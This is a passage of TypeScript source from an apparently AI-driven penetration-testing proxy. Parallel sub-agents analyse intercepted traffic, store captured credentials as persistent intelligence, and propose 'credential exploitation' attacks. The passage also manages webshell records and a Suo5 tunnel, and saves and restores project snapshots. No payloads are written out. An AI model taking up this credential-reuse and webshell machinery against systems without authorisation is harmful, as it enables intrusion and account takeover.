        this.graph.writeNote({ kind: entry.kind, text: entry.data, host, path, persist: entry.persist, tag: entry.tag, group: entry.group, level: entry.level, color: entry.color }).catch((e) => console.warn('[pentbox] 情报入图失败:', String(e).slice(0, 100)))
        this.broadcastGraphChange(`[${entry.tag || entry.kind}](${entry.level || 'info'}) ${host}${path}: ${entry.data.slice(0, 80)}`)
      }
    }
    // 内存降级缓存（Neo4j 不可用时兜底；Neo4j 可用时仅作即时查重辅助）
    this.analysisDigest.push(entry)
    // 滚动条目窗口：持久条目保留，非持久只留最近 20 条
    const roll = this.analysisDigest.filter((e) => !e.persist)
    if (roll.length > 20) {
      const dropCount = roll.length - 20
      let dropped = 0
      this.analysisDigest = this.analysisDigest.filter((e) => {
        if (e.persist || dropped >= dropCount) return true
        dropped++
        return false
      })
    }
    // 全局 digest 总量上限（防 token 失控）：持久条目最多 60 条
    const pers = this.analysisDigest.filter((e) => e.persist)
    if (pers.length > 60) {
      const overflow = pers.length - 60
      let dropped = 0
      this.analysisDigest = this.analysisDigest.filter((e) => {
        if (!e.persist || dropped >= overflow) return true
        dropped++
        return false
      })
    }
    this.invalidateDigestCache()  // 情报已变更（写图/内存 digest）→ 下一条分析/渗透立即看到新情报
  }

  /** 移除全局情报条目（按 kind+host+path 精确匹配；进行中渗透/临时标记移除用） */
  private removeDigest(kind: DigestEntry['kind'], host: string, path: string): void {
    this.analysisDigest = this.analysisDigest.filter((e) => !(e.kind === kind && e.host === host && e.path === path))
    if (this.graph.enabled) this.graph.removePenetration(host, path, '').catch((e) => console.warn('[pentbox] 渗透状态移除失败:', String(e).slice(0, 100)))
  }

  /** 全局情报 TTL 缓存：10 槽并行分析共享同一份图快照，避免每批 10 次重复查询 Neo4j；写图操作主动失效，TTL 兜底 */
  private digestCache: { text: string; ts: number } | null = null
  private digestLoading: Promise<string> | null = null
  private static readonly DIGEST_TTL_MS = 8000

  /** 写图后调用：失效 digest 缓存（下一条分析/渗透立即看到新情报；在途查询不受影响，落缓存后自然更新） */
  private invalidateDigestCache(): void {
    this.digestCache = null
  }

  /** 渲染全局情报注入文本：优先 Neo4j 会话图查询（TTL 缓存 + 并发单飞），Neo4j 不可用时降级内存 digest */
  private async digestPrompt(): Promise<string> {
    const now = Date.now()
    if (this.digestCache && now - this.digestCache.ts < ApiServer.DIGEST_TTL_MS) return this.digestCache.text
    // 并发单飞：10 个并行子 Agent 同时请求时共享同一次查询，避免重复打 Neo4j
    if (this.digestLoading) return this.digestLoading
    this.digestLoading = this.loadDigest().then((text) => {
      this.digestCache = { text, ts: Date.now() }
      return text
    }).finally(() => { this.digestLoading = null })
    return this.digestLoading
  }

  private async loadDigest(): Promise<string> {
    if (this.graph.enabled) {
      const g = await this.graph.contextPrompt()
      if (g) return g
    }
    if (!this.analysisDigest.length) return ''
    const pers = this.analysisDigest.filter((e) => e.persist)
    const roll = this.analysisDigest.filter((e) => !e.persist)
    const lines: string[] = []
    if (pers.length) {
      lines.push('【持久情报】（已确认/高价值，全生命周期保留）')
      for (const e of pers) lines.push(`  [${e.kind}] ${e.host}${e.path}：${e.data}`)
    }
    if (roll.length) {
      lines.push('【最近分析流水】')
      for (const e of roll) lines.push(`  [${e.kind}] ${e.host}${e.path}：${e.data}`)
    }
    return `【全局情报】多 Agent 战况共享：\n${lines.join('\n')}\n（结合这些情报判断当前流量是否与已知发现关联、是否同一目标的其他风险面）\n\n`
  }

  /** 分析消费泵（并发 10 个子 Agent）：队列取 → 本地 Hermes 并行分析（10 槽独立会话）→ 写回；单条失败跳过不阻塞 */
  private inFlight = 0
  private startAnalyzeLoop(): void {
    setInterval(() => {
      // 意见卡超时自动恢复：用户长时间未决策（未点渗透/未取消/未关卡片）的槽恢复流量分析，防 10 槽全部被卡片暂停导致全队停摆
      if (this.pendingAdviceSlots.size) {
        const now = Date.now()
        for (const [slot, ts] of this.pendingAdviceSlots) {
          if (now - ts > ApiServer.ADVICE_TIMEOUT_MS) {
            this.pendingAdviceSlots.delete(slot)
            console.log(`[analyze] 槽 ${slot} 意见卡超时未决策，自动恢复流量分析`)
          }
        }
      }
      while (this.inFlight < ApiServer.MAX_PARALLEL && this.analyzeQueue.length) {
        const id = this.analyzeQueue.shift()!
        const st = this.analyzeMap.get(id)
        if (!st || st.state === 'done') continue
        st.state = 'analyzing'
        this.inFlight++
        const run = () => this.hermesAnalyze(st.detail)
        run()
          .then((r) => {
            st.state = 'done'; st.vuln = r.vuln; st.level = r.level; st.sensitive = r.sensitive
            this.applyAnalyzeResult(st, r, id)
          })
          .catch(async (e) => {
            // 失败重试 1 次（hermesAnalyze 内部按最少连接重新选槽 → 天然换槽；模型 API 抖动/超时常见，直接丢弃会静默漏报）
            console.warn(`[analyze] #${id} 分析失败，重试 1 次:`, String((e as Error).message ?? e).slice(0, 200))
            try {
              const r = await run()
              st.state = 'done'; st.vuln = r.vuln; st.level = r.level; st.sensitive = r.sensitive
              this.applyAnalyzeResult(st, r, id)
            } catch (e2) {
              console.error(`[analyze] #${id} 重试仍失败，丢弃:`, String((e2 as Error).message ?? e2).slice(0, 200))
              st.state = 'done'; st.vuln = false; st.level = 'info'
            }
          })
          .finally(() => { this.inFlight-- })
      }
    }, 300)
  }

  /** 分析结果落账（.then 成功路径与失败重试路径共用）：整合落图 + 全局情报 digest + 意见卡推送 */
  private applyAnalyzeResult(
    st: { state: 'queued' | 'analyzing' | 'done'; vuln?: boolean; level?: string; detail?: unknown; url?: string; sensitive?: { type: string; value: string; level?: string }[] },
    r: { vuln: boolean; level: string; sensitive: { type: string; value: string; level: string }[]; advice: string; slot: number },
    id: number,
  ): void {
    const u = st.url || ''
    const host = this.hostOf(u)
    const path = u.replace(/^https?:\/\/[^/]+/i, '') || ''
    // 操作日志：分析完成（仅记录有结论的流量——漏洞/意见/敏感项；纯噪音不刷屏）
    if (r.vuln || r.advice || (r.sensitive || []).length > 0) {
      const tags = (r.sensitive || []).slice(0, 5).map((s) => s.type).join(', ')
      this.log(r.vuln ? 'warn' : 'info', `[分析] ${host}${path} → ${r.vuln ? `疑似漏洞(${r.level})` : '无漏洞'}${r.advice ? ` · 建议:${(r.advice.match(/可进行\s*(.+?)\s*渗透/)?.[1] || '').slice(0, 20)}` : ''}${tags ? ` · 标签:${tags}` : ''}`)
    }
    // 整合落图：分析结论挂到与站点地图相同的 Api 节点链上（Host→Api→ANALYZED→Analysis）
    if (host) {
      const dm = (st.detail as { reqLine?: string } | undefined)?.reqLine?.match(/^(\S+)/)
      const sensTxt = (r.sensitive || []).map((s) => `${s.type}:${String(s.value).slice(0, 40)}`).join('; ').slice(0, 400)
      // 条目颜色 = 最高敏感等级色（HAE fixed level，与前端行染色同源）
      const lvOrder = ['info', 'low', 'medium', 'high']
      const maxLv = (r.sensitive || []).reduce((m, s) => (lvOrder.indexOf(s.level ?? 'info') > lvOrder.indexOf(m) ? (s.level ?? 'info') : m), 'info')
      this.graph.writeAnalysis({ host, path: path || '/', method: dm ? dm[1] : 'GET', level: r.level, vuln: r.vuln, advice: (r.advice || '').slice(0, 200), sens: sensTxt, sensCount: (r.sensitive || []).length, color: HAE_LEVEL_COLOR[maxLv] }).catch((e) => console.warn('[pentbox] 分析结论入图失败:', String(e).slice(0, 100)))
      this.invalidateDigestCache()  // 分析结论落图 → 后续 digest 包含最新分析
    }
    // 全局情报 digest（结构化分层）：
    // 1) 漏洞/分析结论 → 滚动流水（20 条窗口）
    if (r.vuln || r.advice) {
      this.pushDigest({ kind: 'vuln', host, path, data: `${r.vuln ? `漏洞(${r.level})` : '分析'}:${(r.advice || '').slice(0, 80)}`, persist: false })
    }
    // 2) 敏感凭据 → 持久情报（全生命周期保留，子 Agent 共享杠杆）+ 自动凭据利用意见卡（HAE_CRED_TAGS 判定凭据类标签）
    for (const s of r.sensitive || []) {
      const t = String(s.type || '').trim()
      const isCred = HAE_CRED_TAGS.has(t)
      const credHost = host || '未知'
      const tagMeta = HAE_TAGS[t]
      if (isCred) {
        this.pushDigest({ kind: 'cred', host: credHost, path, data: `${t}:${String(s.value).slice(0, 200)}`, persist: true, tag: t, group: tagMeta?.group, level: (s.level as DigestEntry['level']) || tagMeta?.level || 'high', color: tagMeta?.color })
        // 凭据自动意见：攻击凭据是最高价值杠杆 → 自动推"凭据利用"意见卡（不打断分析）；静态资源不推（字段名≠真凭据，防误报刷屏）；漏斗模式纯审计不发卡（被动/全自动均发卡，是否自动渗透由前端按审批开关决定）
        if (this.pentestMode !== 'funnel' && u && !STATIC_RESOURCE_RE.test(u)) {
          const credKey = `${normalizeTargetKey(u)}|凭据利用`
          if (!this.advisedKeys.has(credKey) && !this.penetratedKeys.has(credKey) && !this.penetratingKeys.has(credKey)) {
            // 凭据卡带完整 URL（供渗透审批定位目标）+ 说明凭据利用属只读验证（审批官可判定为安全）
            this.pushSse({ type: 'analyze-advice', id, url: u, advice: `经 Hermes 分析 ${u} 可进行 凭据利用 渗透（使用已捕获凭据做只读登录/接口访问验证，不修改任何数据），是否进行`, level: s.level || 'high', slot: r.slot })
            this.advisedKeys.add(credKey)
            this.pendingAdviceSlots.set(r.slot, Date.now())
          }
        }
      }
    }
    // 3) 非凭据标签（指纹/基础信息/潜在漏洞/其他）→ 滚动流水（带 HaENet 标签与等级）
    for (const s of r.sensitive || []) {
      const t = String(s.type || '').trim()
      if (!HAE_CRED_TAGS.has(t)) {
        const lv = s.level || 'info'
        const tagMeta = HAE_TAGS[t]
        const data = `${t}(${lv}${tagMeta ? '/' + tagMeta.cn : ''}):${String(s.value).slice(0, 60)}`
        this.pushDigest({ kind: t.includes('Nday') || t.includes('nday') ? 'nday' : 'note', host, path, data, persist: false, tag: t, group: tagMeta?.group, level: (lv as DigestEntry['level']) || tagMeta?.level || 'info', color: tagMeta?.color })
      }
    }
    // 渗透意见 → SSE 推送（前端 Hermes Agent 聊天框渲染意见卡：进行/取消/回复；slot 绑定提出意见的子 Agent，进行渗透由该子 Agent 执行）
    // 发卡去重（统一 key：normalizeTargetKey 规范化 Host+完整路径+查询 | 方式）：
    // 同 URL 同方式已推送过（advisedKeys）/ 已渗透过（penetratedKeys）/ 正在渗透（penetratingKeys）→ 不再推送；不同方式可再推
    // 漏斗模式：子 Agent 纯流量审计，不发送渗透意见卡（主 Agent 全自动渗透由 /pentest 指令驱动）；被动/全自动均发卡——是否自动渗透由前端按智能审批开关决定
    if (this.pentestMode !== 'funnel' && r.advice) {
      const pm = r.advice.match(/可进行\s*(.+?)\s*渗透/)?.[1] || ''
      // 静态资源不推意见卡（防误报刷屏；凭据/分析结论仍入 digest）
      const isStatic = u ? STATIC_RESOURCE_RE.test(u) : false
      const key = u && !isStatic ? `${normalizeTargetKey(u)}|${pm}` : ''
      if (key && !this.advisedKeys.has(key) && !this.penetratedKeys.has(key) && !this.penetratingKeys.has(key)) {
        this.pushSse({ type: 'analyze-advice', id, url: u, advice: r.advice, level: r.level, slot: r.slot })
        this.advisedKeys.add(key)
        this.pendingAdviceSlots.set(r.slot, Date.now())  // 提出卡片 → 暂停该槽流量分析（等用户决策渗透/取消/超时自动恢复）
      }
    }
  }

  // ---------------- 漏洞库（Agent 可增删改查；数据随项目二进制快照持久化） ----------------
  private vulns: Vuln[] = []
  private vulnSeq = 0
  // ---------------- WebShell 管理（CRUD 数据随项目二进制快照持久化；exec/ping 经内置代理发出，流量可被面板捕获） ----------------
  private webshells: { id: number; type: string; script: string; url: string; password: string; key: string; status: string; ts: number; cryption?: string; payload?: string; encoding?: BufferEncoding; headers?: string; reqLeft?: string; reqRight?: string; connTimeout?: number; readTimeout?: number; remark?: string }[] = []
  private wsSeq = 0
  /** Suo5 正向代理进程（HTTP 隧道，本地 SOCKS5） */
  private suo5Proc: { proc: ReturnType<typeof spawn>; port: number; url: string } | null = null
  /** WebShell 客户端（协议执行层：请求/命令/存活/文件操作，独立模块可单测）；构造器内初始化（依赖 engine） */
  private wsClient: WebShellClient
  /** WebShell 变更持久化：合并异步保存到项目快照（不阻塞 HTTP 路径） */
  private saveWebshells(): void {
    this.queueSessionSave()
  }

  /** 漏洞变更持久化：合并异步保存到项目快照（不阻塞 HTTP 路径） */
  private saveVulns(): void {
    this.queueSessionSave()
  }
  // ---------------- 会话持久化（类 Burp 项目文件：单文件二进制快照，v8 原生序列化 + gzip 压缩 + 魔数头；自动保存 + 启动恢复 + 项目管理） ----------------
  /** 快照魔数 'HPBS'（HermesPentBox Snapshot）+ u32 版本号（头 8 字节，之后为 gzip(v8 序列化) 载荷） */
  private static readonly SNAPSHOT_MAGIC = 'HPBS'
  private static readonly SNAPSHOT_VERSION = 1
  /** 默认项目文件（未显式打开/另存为时自动保存到此；启动时存在则自动恢复上次会话） */
  private defaultProjectFile = join(homedir(), '.pentbox', 'project.hpbs')
  /** 项目文件目录（项目管理列表扫描） */
  private projectsDir = join(homedir(), '.pentbox', 'projects')
  /** 当前项目文件路径（null = 新建未命名项目） */
  private currentProjectPath: string | null = null
  private lastSavedAt = 0
  /** 自动保存间隔（Burp auto-save 语义：定时快照 + 退出时兜底保存） */
  private static readonly SESSION_AUTOSAVE_MS = 10_000
  /** 用户是否显式配置过上游（仅显式配置才持久化上游——未配置时重启仍默认跟随系统代理保证出网） */
  private upstreamPersisted = false
  private sessionTimer: ReturnType<typeof setInterval> | null = null
  /** 运行中保存合并窗口句柄（500ms 防抖：快速连续变更只异步落盘一次） */
  private sessionFlushTimer: ReturnType<typeof setTimeout> | null = null

  /** 序列化快照 → 二进制 Buffer（魔数头 + gzip(v8 序列化)；Map/Set 原生支持） */
  private encodeSnapshot(data: unknown): Buffer {
    const head = Buffer.alloc(8)
    head.write(ApiServer.SNAPSHOT_MAGIC, 0, 'ascii')
    head.writeUInt32LE(ApiServer.SNAPSHOT_VERSION, 4)
    return Buffer.concat([head, zlib.gzipSync(v8.serialize(data))])
  }

  /** 反序列化快照（校验魔数/版本；损坏或版本不符返回 null） */
  private decodeSnapshot(buf: Buffer): unknown | null {
    try {
      if (!buf || buf.length < 8 || buf.toString('ascii', 0, 4) !== ApiServer.SNAPSHOT_MAGIC) return null
      if (buf.readUInt32LE(4) !== ApiServer.SNAPSHOT_VERSION) return null
      return v8.deserialize(zlib.gunzipSync(buf.subarray(8)))
    } catch { return null }
  }

  /** 保存当前会话为项目快照（path 缺省 = 当前项目文件；未绑定项目时落默认项目文件并绑定） */
  /** 构造快照数据（序列化前统一提取，三路径共用） */
  private buildSnapshot(): Record<string, unknown> {
    return {
      savedAt: Date.now(),
      seq: this.flows.reduce((m, f) => Math.max(m, f.id), 0),
      upstream: this.upstreamPersisted ? this.engine.getUpstream() : null,
      upstreamPersisted: this.upstreamPersisted,
      downstream: this.engine.getDownstream(),   // 下游代理（项目级配置，随项目切换）
      interceptEnabled: this.engine.interceptEnabled,
      mitmEnabled: this.engine.mitmEnabled,
      flows: this.flows,
      flowDetails: this.flowDetails,   // Map 直接序列化（v8 原生支持）
      wsFlows: this.wsFlows,
      analyzeMap: new Map([...this.analyzeMap.entries()].map(([id, st]) => [id, { state: st.state, vuln: st.vuln, level: st.level, url: st.url, sensitive: st.sensitive, skipped: st.skipped, builtin: st.builtin, self: st.self, penetrate: st.penetrate, confirmed: st.confirmed, confLevel: st.confLevel }])),  // detail 与 flowDetails 冗余，不重复落盘
      analysisDigest: this.analysisDigest,
      advisedKeys: this.advisedKeys,         // Set 直接序列化
      penetratedKeys: this.penetratedKeys,   // Set 直接序列化
      vulns: this.vulns,                     // 漏洞库（项目级，随项目切换）
      vulnSeq: this.vulnSeq,
      webshells: this.webshells,             // WebShell 管理（项目级，随项目切换）
      wsSeq: this.wsSeq,
      chatSessionId: this.chatSessionId,     // 主 Agent bridge 会话续传（broker 独立进程，重启后可续传上下文）
      analyzeSlots: this.analyzeSlots,       // 10 个子 Agent 槽会话续传
      chatHistory: this.chatHistory,         // 主对话历史（Hermes Agent 聊天框，项目级）
      logBuf: this.logBuf.slice(-ApiServer.LOG_CAP),  // 操作日志（终端面板；项目级，随快照持久化）
    }
  }

  /** 同步保存（退出/切换项目兜底：保证落盘后才返回）；运行中变更请用 queueSessionSave 异步合并，避免阻塞事件循环 */
  saveSession(path?: string): void {
    let target = path || this.currentProjectPath
    if (!target) target = this.defaultProjectFile
    try {
      mkdirSync(dirname(target), { recursive: true })
      writeFileSync(target, this.encodeSnapshot(this.buildSnapshot()))
      if (!path) this.currentProjectPath = target
      this.lastSavedAt = Date.now()
      console.log(`[pentbox] 项目已保存: ${target}（${this.flows.length} 条流量）`)
    } catch (e) { console.error('[pentbox] 项目保存失败:', String(e).slice(0, 120)) }
  }

  /** 运行中保存：500ms 合并窗口 + 异步写盘（序列化快、写盘不阻塞事件循环；快速连续变更只落盘一次） */
  private queueSessionSave(): void {
    if (this.sessionFlushTimer) return
    this.sessionFlushTimer = setTimeout(() => {
      this.sessionFlushTimer = null
      let target = this.currentProjectPath
      if (!target) target = this.defaultProjectFile
      try {
        const buf = this.encodeSnapshot(this.buildSnapshot())
        mkdirSync(dirname(target), { recursive: true })
        writeFile(target, buf).then(() => {
          this.lastSavedAt = Date.now()
        }).catch((e) => console.error('[pentbox] 项目异步保存失败:', String(e).slice(0, 120)))
      } catch (e) { console.error('[pentbox] 项目异步保存失败:', String(e).slice(0, 120)) }
    }, 500)
  }

  /** 显式保存（/api/session/save、另存为）：异步落盘，await 完成后返回；传 path = 另存为并切换当前项目（不阻塞事件循环，响应前确保已写入） */
  private async saveSessionNow(path?: string): Promise<string | null> {
    let target = path || this.currentProjectPath
    if (!target) target = this.defaultProjectFile
    try {
      const buf = this.encodeSnapshot(this.buildSnapshot())
      mkdirSync(dirname(target), { recursive: true })
      await writeFile(target, buf)
      this.currentProjectPath = target  // 同步 await 内绑定，无竞态
      this.lastSavedAt = Date.now()
      console.log(`[pentbox] 项目已保存: ${target}（${this.flows.length} 条流量）`)
      return target
    } catch (e) { console.error('[pentbox] 项目保存失败:', String(e).slice(0, 120)); return null }
  }

  /** 强杀进程树（Windows taskkill /T；其他平台 kill）——防 detached 子进程残留 */
  private killProcessTree(proc: ReturnType<typeof spawn>): void {
    try {
      if (process.platform === 'win32') {
        const { execSync } = require('node:child_process') as typeof import('node:child_process')
        execSync(`taskkill /pid ${proc.pid} /T /F`, { timeout: 5000, stdio: 'ignore', windowsHide: true })
      } else {
        proc.kill('SIGTERM')
      }
    } catch {
      try { proc.kill() } catch { /* 已退出 */ }
    }
  }

  /** 统一停止应用 spawn 的常驻进程（Agent Bridge / Hermes Gateway / Suo5；应用退出时调用，防 detached 残留导致下次启动复用坏进程） */
  stopAllProcesses(): void {
    if (this.bridgeProc) { this.killProcessTree(this.bridgeProc); this.bridgeProc = null; this.bridgeReady = false }
    if (this.gatewayProc) { this.killProcessTree(this.gatewayProc); this.gatewayProc = null }
    if (this.suo5Proc) { this.killProcessTree(this.suo5Proc.proc); this.suo5Proc = null }
    console.log('[pentbox] 常驻子进程已全部停止')
  }

  /** 加载项目快照（path 缺省 = 默认项目文件，仅当存在时自动恢复上次会话） */
  private loadSession(path?: string): void {
    const file = path || this.defaultProjectFile
    if (!existsSync(file)) return
    const d = this.decodeSnapshot(readFileSync(file))
    if (!d) return
    this.applySnapshot(d)
    this.currentProjectPath = file
    this.graph.setProject(this.projectKeyOf())  // Neo4j 图切换到该项目域
    console.log(`[pentbox] 项目已加载: ${file}（${this.flows.length} 条流量 / ${this.flowDetails.size} 条报文 / ${this.analyzeMap.size} 条分析状态 / ${this.analysisDigest.length} 条情报）`)
  }

  /** 应用快照到运行时状态：流量/报文/分析状态/情报/去重历史还原；进行中状态（渗透中/卡片待决策）重启即失效不恢复 */
  private applySnapshot(d: unknown): void {
    const s = d as Record<string, unknown>
    const flows = Array.isArray(s.flows) ? (s.flows as FlowMeta[]).filter((f) => f && f.id) : []
    if (flows.length > this.cap) flows.splice(0, flows.length - this.cap)
    this.flows = flows
    if (s.flowDetails instanceof Map) this.flowDetails = new Map(s.flowDetails as Map<number, never>)
    if (Array.isArray(s.wsFlows)) this.wsFlows = (s.wsFlows as typeof this.wsFlows).slice(-500)
    // 分析状态：done 原样恢复（流量表 Agent 列/站点地图状态正确）；queued/analyzing 重新入队续分析（detail 从 flowDetails 补齐，缺失则跳过）
    if (s.analyzeMap instanceof Map) {
      let requeued = 0
      for (const [id, it] of s.analyzeMap as Map<number, { state: string; vuln?: boolean; level?: string; url?: string; sensitive?: unknown[]; skipped?: boolean; builtin?: boolean; self?: boolean; penetrate?: boolean; confirmed?: boolean; confLevel?: string }>) {
        if (!it || !id) continue
        const st: NonNullable<ReturnType<ApiServer['analyzeMap']['get']>> = { state: 'done', vuln: !!it.vuln, level: it.level, url: it.url, sensitive: it.sensitive as never, skipped: !!it.skipped, builtin: !!it.builtin, self: !!it.self, penetrate: !!it.penetrate, confirmed: !!it.confirmed, confLevel: it.confLevel }
        if (it.state === 'queued' || it.state === 'analyzing') {
          const detail = this.flowDetails.get(id)
          if (detail && requeued < 50) { st.state = 'queued'; st.detail = detail; this.analyzeQueue.push(id); requeued++ }
          else { st.state = 'done'; st.skipped = true }
        } else {
          st.detail = this.flowDetails.get(id)  // done 条目的 detail 补齐（详情展示/站点地图同步需要）
        }
        this.analyzeMap.set(id, st)
      }
      if (requeued) console.log(`[pentbox] 项目恢复: ${requeued} 条未完成流量重新入队分析`)
    }
    if (Array.isArray(s.analysisDigest)) this.analysisDigest = s.analysisDigest
    if (s.advisedKeys instanceof Set) this.advisedKeys = new Set(s.advisedKeys as Set<string>)
    if (s.penetratedKeys instanceof Set) this.penetratedKeys = new Set(s.penetratedKeys as Set<string>)
    // 漏洞库 / WebShell（项目级数据：随项目快照恢复；旧版独立 JSON 载入的残留被这里覆盖）
    if (Array.isArray(s.vulns)) {
      this.vulns = s.vulns as Vuln[]
      this.vulnSeq = Number(s.vulnSeq) || this.vulns.reduce((m, v) => Math.max(m, v.id), 0)
    }
    if (Array.isArray(s.webshells)) {
      this.webshells = s.webshells as typeof this.webshells
      this.wsSeq = Number(s.wsSeq) || this.webshells.reduce((m, v) => Math.max(m, v.id), 0)
    }
    // Agent 会话续传：bridge broker 为独立进程，应用重启后恢复会话指针可续传上下文（broker 已重启则自动新建干净会话，无害）
    if (typeof s.chatSessionId === 'string' && s.chatSessionId) this.chatSessionId = s.chatSessionId
    if (Array.isArray(s.analyzeSlots)) {
      const slots = s.analyzeSlots as (string | null)[]
      for (let i = 0; i < ApiServer.MAX_PARALLEL; i++) if (typeof slots[i] === 'string' && slots[i]) this.analyzeSlots[i] = slots[i]
    }
    // 主对话历史（随项目恢复）
    if (Array.isArray(s.chatHistory)) this.chatHistory = (s.chatHistory as { role: 'user' | 'ai'; text: string; ts: number }[]).slice(-ApiServer.CHAT_HISTORY_CAP)
    // 操作日志（随项目恢复；seq 继续单调递增）
    if (Array.isArray(s.logBuf)) {
      this.logBuf = (s.logBuf as { seq: number; ts: number; level: 'info' | 'ok' | 'warn' | 'err'; msg: string }[]).slice(-ApiServer.LOG_CAP)
      this.logSeq = this.logBuf.reduce((m, x) => Math.max(m, x.seq), 0)
    }
    // 上游：仅显式配置过才恢复（覆盖系统代理默认）
    if (s.upstream && (s.upstream as Upstream).type) { this.engine.setUpstream(s.upstream as Upstream); this.upstreamPersisted = s.upstreamPersisted === true }
    // 下游代理（随项目恢复；快照无下游 → 直连，防止切换项目残留旧项目配置）
    this.engine.setDownstream((s.downstream as Downstream | null) || null)
    if (typeof s.interceptEnabled === 'boolean') this.engine.interceptEnabled = s.interceptEnabled
    if (typeof s.mitmEnabled === 'boolean') this.engine.mitmEnabled = s.mitmEnabled
    this.engine.restoreSeq(Number(s.seq) || this.flows.reduce((m, f) => Math.max(m, f.id), 0))
  }

  /** 打开项目（项目管理：切换项目文件）：先校验快照可读（不破坏当前状态）→ 自动保存当前项目 → 销毁离开项目的 Agent 会话 → 清空内存 → 应用快照 + 切换图项目域 */
  openProject(path: string): void {
    if (!path) throw new Error('path 缺失')
    if (!existsSync(path)) throw new Error(`项目文件不存在: ${path}`)
    const d = this.decodeSnapshot(readFileSync(path))
    if (!d) throw new Error(`项目文件损坏或版本不符: ${path}`)
    this.saveSession()  // 切换前自动保存当前项目（类 Burp：切换项目不丢当前工作区）
    this.destroyAgentSessions()  // 销毁当前项目的 Agent 会话（隔离 + 释放 broker）
    this.resetRuntimeState()
    this.applySnapshot(d)
    this.currentProjectPath = path
    this.graph.setProject(this.projectKeyOf())  // Neo4j 图切换到该项目域
    console.log(`[pentbox] 项目已打开: ${path}（图域 ${this.graph.projectKey}）`)
  }

  /** 新建项目：自动保存当前项目 → 销毁 Agent 会话 → 清空全部运行时状态 */
  resetProject(): void {
    this.saveSession()  // 新建前自动保存当前项目（类 Burp：不丢当前工作区）
    this.destroyAgentSessions()
    this.resetRuntimeState()
    this.currentProjectPath = null
    this.lastSavedAt = 0
    this.graph.setProject('default')
  }

  /** 清空运行时状态（打开/新建项目用；引擎配置由快照加载覆盖） */
  private resetRuntimeState(): void {
    this.flows = []
    this.flowDetails.clear()
    this.wsFlows = []
    this.analyzeMap.clear()
    this.analyzeQueue = []
    this.analysisDigest = []
    this.advisedKeys.clear()
    this.penetratedKeys.clear()
    this.penetratingKeys.clear()
    this.pendingAdviceSlots.clear()
    this.penetrateTargets.clear()
    this.graphApiSynced.clear()
    this.vulns = []       // 项目级数据：随项目切换清空（打开项目后由快照恢复）
    this.vulnSeq = 0
    this.webshells = []
    this.wsSeq = 0
    this.chatSessionId = null  // Agent 会话指针随项目隔离（切换项目后新建干净会话）
    this.analyzeSlots = new Array(ApiServer.MAX_PARALLEL).fill(null)
    this.chatHistory = []  // 主对话历史随项目隔离（打开项目后由快照恢复）
    this.logBuf = []       // 操作日志随项目隔离（打开项目后由快照恢复）
    this.invalidateDigestCache()
    this.engine.restoreSeq(0)
    this.engine.clearAllPenetrateTargets()
    this.engine.setDownstream(null)   // 下游代理（项目级配置）：新建/切换项目时复位直连，由快照恢复
    this.engine.setInterceptEnabled(false)
    this.engine.mitmEnabled = true
  }

  /** 项目列表（项目管理面板：默认项目文件 + 项目目录扫描） */
  /** 项目列表：默认项目 + 项目目录扫描（~/.pentbox/projects/）。保存到任意路径的项目由前端 localStorage 记录（保存对话框返回路径即来源） */
  listProjects(): { name: string; path: string; size: number; mtime: number }[] {
    const out: { name: string; path: string; size: number; mtime: number }[] = []
    const seen = new Set<string>()
    const push = (name: string, path: string) => {
      if (!path || seen.has(path)) return
      seen.add(path)
      try {
        if (existsSync(path)) {
          const st = statSync(path)
          out.push({ name, path, size: st.size, mtime: st.mtimeMs })
        }
      } catch { /* 文件缺失跳过 */ }
    }
    push('默认项目', this.defaultProjectFile)
    try {
      mkdirSync(this.projectsDir, { recursive: true })
      for (const f of readdirSync(this.projectsDir)) {
        if (!f.endsWith('.hpbs')) continue
        push(f.replace(/\.hpbs$/, ''), join(this.projectsDir, f))
      }
    } catch (e) { console.warn('[pentbox] 项目目录扫描失败:', String(e).slice(0, 100)) }
    return out
  }

  // ---------------- 项目域（Agent 会话 / Neo4j 图按项目隔离管理） ----------------
  /** 当前项目域 key：默认项目 → 'default'（与旧数据迁移一致）；其他项目 → 项目文件名 */
  private projectKeyOf(): string {
    if (!this.currentProjectPath || this.currentProjectPath === this.defaultProjectFile) return 'default'
    return basename(this.currentProjectPath).replace(/\.hpbs$/i, '') || 'default'
  }
  /** 会话 id 项目前缀：Agent 会话明确归属当前项目（如 pentbox-projA-<ts>） */
  private projectSessionPrefix(): string {
    return `pentbox-${this.projectKeyOf()}`
  }
  /** 销毁离开项目的 Agent 会话（切换/新建项目时）：释放 bridge broker 会话（隔离 + 防 broker 内存累积）——profile 与各会话归属档案匹配 */
  private destroyAgentSessions(): void {
    if (this.chatSessionId) {
      this.bridge.destroy(this.chatSessionId, 'hermespentbox').catch((e) => console.warn('[pentbox] 会话销毁失败:', String(e).slice(0, 100)))
    }
    for (const s of this.analyzeSlots) {
      if (s) this.bridge.destroy(s, 'hermespentbox-analyzer').catch((e) => console.warn('[pentbox] 会话销毁失败:', String(e).slice(0, 100)))
    }
  }

  /** 监听配置持久化文件（~/.pentbox/config.bin，二进制）：监听地址/端口 + 窗口状态等启动参数。
   * 启动参数（绑定先于 ApiServer 启动）无法进项目快照，作为全局二进制配置单独保存 */
  private static readonly CONFIG_FILE = (() => {
    try { return join(homedir(), '.pentbox', 'config.bin') } catch { return '' }
  })()
  /** 读全局配置（config.bin，v8 序列化；损坏或不存在返回空对象） */
  private static readConfig(): Record<string, unknown> {
    try {
      const { existsSync, readFileSync } = require('node:fs') as typeof import('node:fs')
      if (ApiServer.CONFIG_FILE && existsSync(ApiServer.CONFIG_FILE)) {
        const d = v8.deserialize(readFileSync(ApiServer.CONFIG_FILE))
        return (d && typeof d === 'object' ? d : {}) as Record<string, unknown>
      }
    } catch { /* 无配置或损坏 → 默认 */ }
    return {}
  }
  /** 写全局配置（合并补丁） */
  private static writeConfig(patch: Record<string, unknown>): void {
    try {
      const { writeFileSync, mkdirSync } = require('node:fs') as typeof import('node:fs')
      const { dirname } = require('node:path') as typeof import('node:path')
      if (!ApiServer.CONFIG_FILE) return
      const cfg = { ...ApiServer.readConfig(), ...patch }
      mkdirSync(dirname(ApiServer.CONFIG_FILE), { recursive: true })
      writeFileSync(ApiServer.CONFIG_FILE, v8.serialize(cfg))
    } catch (e) { console.error('[pentbox] 全局配置落盘失败:', String(e).slice(0, 120)) }
  }
  /** 监听配置（默认 0.0.0.0 + API 8877；代理 8899 / 终端 8878 固定默认，仅 IP 跟随）——供 electron/main.ts 绑定 */
  static loadListen(): { ip: string; api: number } {
    const def = { ip: '0.0.0.0', api: Number(process.env.PENTBOX_API_PORT ?? 8877) }
    const d = ApiServer.readConfig()
    return {
